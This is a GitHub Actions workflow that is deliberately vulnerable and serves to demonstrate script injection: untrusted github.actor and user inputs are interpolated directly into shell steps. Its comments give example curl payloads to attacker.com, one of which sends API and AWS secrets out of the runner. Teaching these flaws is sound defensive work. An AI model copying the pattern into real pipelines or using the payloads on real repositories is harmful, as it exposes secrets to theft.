name: "VULNERABLE: Package Update Workflow"

# ⚠️ WARNING: This workflow is intentionally vulnerable for demonstration purposes
# DO NOT use this pattern in production!

on:
  workflow_dispatch:
    inputs:
      package_name:
        description: 'Package name to update'
        required: true
        type: string
      package_version:
        description: 'Package version'
        required: true
        type: string

jobs:
  vulnerable-update:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: "PATTERN 1: Untrusted GitHub Context (github.actor)"
        run: |
          git config user.name "${{ github.actor }}"
          git config user.email "${{ github.actor }}@users.noreply.github.com"
        # ⚠️ VULNERABLE: github.actor is untrusted and directly interpolated
        # Can be manipulated by changing GitHub username before triggering workflow

      - name: "PATTERN 2: Command Injection (No Secrets Available)"
        continue-on-error: true
        run: |
          echo "Processing package: ${{ inputs.package_name }}"
          git checkout -b "update-${{ inputs.package_name }}-${{ inputs.package_version }}" || true
        # ⚠️ VULNERABLE: Direct interpolation allows command injection
        # Attack: package_name = '$(curl https://attacker.com?data=leaked)'
        # Demonstrates injection works, but no secrets in this step's environment

      - name: "PATTERN 3: Secret Exfiltration (Secrets in env + Direct Interpolation)"
        continue-on-error: true
        env:
          API_TOKEN: ${{ secrets.DEMO_SECRET }}
          AWS_KEY: ${{ secrets.DEMO_AWS_KEY }}
        run: |
          echo "Sending notification for package: ${{ inputs.package_name }}"
          echo "API Token available: ${API_TOKEN:0:10}..."
          echo "AWS Key available: ${AWS_KEY:0:10}..."
        # ⚠️ CRITICAL: Secrets in env + direct interpolation = exfiltration possible
        # Attack: package_name = '$(curl "https://attacker.com?token=$API_TOKEN\&aws=$AWS_KEY")'
        # Note: URL must be quoted and & must be escaped as \& to send both parameters
        # Command substitution has full access to all environment variables in this step

      - name: Summary
        run: |
          echo "✅ Workflow completed - all vulnerable patterns demonstrated"
          echo "⚠️ In production, any of these patterns could lead to complete compromise"
